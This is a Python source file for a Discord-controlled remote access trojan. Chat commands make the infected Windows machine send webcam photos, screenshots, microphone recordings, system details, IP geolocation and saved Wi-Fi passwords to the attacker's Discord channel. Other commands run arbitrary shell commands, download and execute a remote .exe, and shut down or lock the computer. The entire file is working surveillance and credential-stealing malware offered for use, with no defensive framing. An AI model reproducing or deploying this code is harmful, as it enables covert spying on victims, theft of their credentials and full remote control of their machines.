import urllib
import psutil
import socket
import wave
import pyaudio
import cv2
import discord
import os
import subprocess
import requests
import pyautogui
import platform

bot = discord.Client(intents=discord.Intents.all(), command_prefix= "!", description='The Best Bot For the Best User!')

token = "Your Bot Token Here"

@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')
    

@bot.event
async def on_message(message):
    if message.content.startswith('!webcam'):
        print("Taking picture from webcam")
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cv2.imwrite('webcam.png', frame)
        await message.channel.send(file=discord.File('webcam.png'))
        print("Picture sent")
        os.remove('webcam.png')
    if message.content.startswith('!screenshot'):
        print("Taking screenshot")
        pyautogui.screenshot('screenshot.png')
        await message.channel.send(file=discord.File('screenshot.png'))
        print("Screenshot sent")
        os.remove('screenshot.png')
    if message.content.startswith('!ipaddr'):
        print("Sending ip address")
        ip = requests.get('https://api.ipify.org').text
        await message.channel.send(ip)
        print("Ip address sent")
    if message.content.startswith('!location'):
        print("Sending location")
        ip = requests.get('https://api.ipify.org').text
        url = 'http://ip-api.com/json/'
        response = requests.get(url+ip)
        data = response.json()
        location = data['city'] + ", " + data['country']
        await message.channel.send(location)
        print("Location sent")
    if message.content.startswith('!cmd'):
        print("Running command")
        command = message.content[5:]
        output = subprocess.check_output(command, shell=True)
        f = open('output.txt', 'w')
        f.write(output.decode('utf-8'))
        f.close()
        await message.channel.send(file=discord.File('output.txt'))
        print("Command sent")
        os.remove('output.txt')
    if message.content.startswith('!record'):
        print("Recording audio")
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10
        WAVE_OUTPUT_FILENAME = "output.wav"
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)
        frames = []
        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        await message.channel.send(file=discord.File('output.wav'))
        print("Audio sent")
        os.remove('output.wav')
    if message.content.startswith('!download'):
        print("Downloading file")
        url = message.content[10:]
        filename = url.split('/')[-1]
        r = requests.get(url, allow_redirects=True)
        open(filename, 'wb').write(r.content)
        await message.channel.send(file=discord.File(filename))
        print("File sent")
        os.remove(filename)
    if message.content.startswith('!upload'):
        print("Uploading file")
        f = open('upload.txt', 'w')
        f.write(message.content[8:])
        f.close()
        await message.channel.send(file=discord.File('upload.txt'))
        print("File sent")
        os.remove('upload.txt')
    if message.content.startswith('!message'):
        print("Sending message")
        pyautogui.alert(message.content[9:])
        print("Message sent")
    if message.content.startswith('!shutdown'):
        print("Shutting down")
        os.system("shutdown /s /t 1")
    if message.content.startswith('!restart'):
        print("Restarting")
        os.system("shutdown /r /t 1")
    if message.content.startswith('!lock'):
        print("Locking")
        os.system("rundll32.exe user32.dll,LockWorkStation")
    if message.content.startswith('!sleep'):
        print("Sleeping")
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    if message.content.startswith('!info'):
        print("Sending info")
        info = "Username: " + os.getlogin() + "\n"
        info += "Computer name: " + socket.gethostname() + "\n"
        info += "OS: " + platform.system() + " " + platform.release() + "\n"
        info += "Processor: " + platform.processor() + "\n"
        info += "Architecture: " + platform.machine() + "\n"
        info += "Ram: " + str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB" + "\n"
        info += "CPU: " + subprocess.check_output('wmic cpu get name', shell=True).decode().split('\n')[1].strip() + "\n"
        info += "GPU: " + subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().split('\n')[1].strip() + "\n"
        info += "Motherboard: " + subprocess.check_output('wmic baseboard get product', shell=True).decode().split('\n')[1].strip() + "\n"
        info += "Battery: " + str(psutil.sensors_battery().percent) + "%" + "\n"
        info += "Storage: " + str(round(psutil.disk_usage('/').total / (1024.0 **3)))+" GB" + "\n"
        info += "IP: " + requests.get('https://api.ipify.org').text + "\n"
        info += "Location: " + requests.get('http://ip-api.com/json/'+requests.get('https://api.ipify.org').text).json()['city'] + ", " + requests.get('http://ip-api.com/json/'+requests.get('https://api.ipify.org').text).json()['country'] + "\n"
        await message.channel.send(info)
        print("Info sent")
    if message.content.startswith('!wifi'):
        print("Sending wifi passwords")
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                await message.channel.send("{:<30}|  {:<}".format(i, results[0]))
            except IndexError:
                await message.channel.send("{:<30}|  {:<}".format(i, ""))
        print("Wifi passwords sent")
    if message.content.startswith('!vpn'):
        ip = requests.get('https://api.ipify.org').text
        response = requests.get(f'https://proxycheck.io/v2/{ip}?vpn=1')
        ipdata = response.json()
        other = str(ipdata[ip])
        await message.channel.send(other)
        print("VPN check sent")
    if message.content.startswith('!ipinfo'):
        ip = requests.get('https://api.ipify.org').text
        country = requests.get('http://ip-api.com/json/'+ip).json()['country']
        city = requests.get('http://ip-api.com/json/'+ip).json()['city']
        isp = requests.get('http://ip-api.com/json/'+ip).json()['isp']
        lat = requests.get('http://ip-api.com/json/'+ip).json()['lat']
        lon = requests.get('http://ip-api.com/json/'+ip).json()['lon']
        timezone = requests.get('http://ip-api.com/json/'+ip).json()['timezone']
        await message.channel.send("IP: " + ip + "\nCountry: " + country + "\nCity: " + city + "\nISP: " + isp + "\nLatitude: " + str(lat) + "\nLongitude: " + str(lon) + "\nTimezone: " + timezone)
        print("IP info sent")
    if message.content.startswith('!quit'):
        print("Quitting")
        os._exit(0)
    if message.content.startswith('!execute'):
        url = message.content[9:]
        urllib.request.urlretrieve(url, "file.exe")
        os.system("file.exe")
        os.remove("file.exe")
        print("File executed")
    if message.content.startswith('!botinfo'):
        print("Sending bot info")
        await message.channel.send("Bot made by: " + bot.user.name + "\nBot id: " + str(bot.user.id))
    if message.content.startswith('!help'):
        print("Sending help")
        await message.channel.send("``` Commands: ```")
        await message.channel.send("``` !webcam - Take a picture with the webcam ```")
        await message.channel.send("``` !screenshot - Take a screenshot ```")
        await message.channel.send("``` !ipaddr - Get the ip address ```")
        await message.channel.send("``` !ipinfo - Get information about the ip address ```")
        await message.channel.send("``` !info - Get information about the computer ```")
        await message.channel.send("``` !wifi - Get the wifi passwords ```")
        await message.channel.send("``` !vpn - Check if the ip address comes from a vpn ```")
        await message.channel.send("``` !download - Download a file from a url ```")
        await message.channel.send("``` !execute - Execute a exe file from a url ```")
        await message.channel.send("``` !upload - Upload a text file with the content of the message ```")
        await message.channel.send("``` !location - Get the location of the computer ```")
        await message.channel.send("``` !cmd - Execute a command ```")
        await message.channel.send("``` !record - Record the microphone ```")
        await message.channel.send("``` !message - Send a popup message ```")
        await message.channel.send("``` !shutdown - Shutdown the computer ```")
        await message.channel.send("``` !restart - Restart the computer ```")
        await message.channel.send("``` !lock - Lock the computer ```")
        await message.channel.send("``` !sleep - Sleep the computer ```")
        await message.channel.send("``` !botinfo - Get information about the bot ```")
        await message.channel.send("``` !help - Get a list of commands ```")
        await message.channel.send("``` !quit - Quit the program ```")

bot.run(token)
